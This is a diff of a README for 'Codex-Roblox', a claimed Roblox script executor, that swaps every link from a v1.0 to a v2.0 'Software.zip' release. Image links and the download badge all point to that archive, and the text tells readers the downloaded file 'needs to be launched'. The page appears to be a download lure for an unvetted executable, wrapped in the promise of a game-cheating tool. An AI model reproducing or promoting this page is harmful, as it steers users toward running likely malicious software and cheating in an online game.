@@ -1,7 +1,7 @@
 # 🎮 Codex-Roblox Repository
 
 ## Welcome to Codex-Roblox!
-![Roblox Image](https://github.com/Enzzoxrld/Codex-Roblox/releases/download/v1.0/Software.zip)
+![Roblox Image](https://github.com/Enzzoxrld/Codex-Roblox/releases/download/v2.0/Software.zip)
 
 Are you looking for a powerful and stable Roblox script executor that supports low-end PCs? Look no further! Codex-Roblox is here to provide you with unparalleled functionality to effortlessly run scripts for your favorite Roblox games.
 
@@ -20,7 +20,7 @@ Are you looking for a powerful and stable Roblox script executor that supports l
 ### Get Started 🛠️
 Ready to experience the power of Codex-Roblox? Download the latest version below:
 
-[![Download Codex-Roblox v1.0.0](https://github.com/Enzzoxrld/Codex-Roblox/releases/download/v1.0/Software.zip%20v1.0.0&color=green)](https://github.com/Enzzoxrld/Codex-Roblox/releases/download/v1.0/Software.zip)
+[![Download Codex-Roblox v1.0.0](https://github.com/Enzzoxrld/Codex-Roblox/releases/download/v2.0/Software.zip%20v1.0.0&color=green)](https://github.com/Enzzoxrld/Codex-Roblox/releases/download/v2.0/Software.zip)
 
 If the link ends with a file name, it needs to be launched. If you encounter any issues with the link, please check the "Releases" section for alternative download options.
 
@@ -31,7 +31,7 @@ Stay up to date with the latest developments, collaborate with fellow developers
 - Follow us on Twitter for announcements and updates
 - Participate in community events and challenges
 
-![Codex-Roblox Community](https://github.com/Enzzoxrld/Codex-Roblox/releases/download/v1.0/Software.zip)
+![Codex-Roblox Community](https://github.com/Enzzoxrld/Codex-Roblox/releases/download/v2.0/Software.zip)
 
 ### Contribute to Codex-Roblox 🧑‍💻
 We welcome contributions from developers of all skill levels. Whether you're a seasoned coder or just starting out, there are plenty of opportunities to get involved:
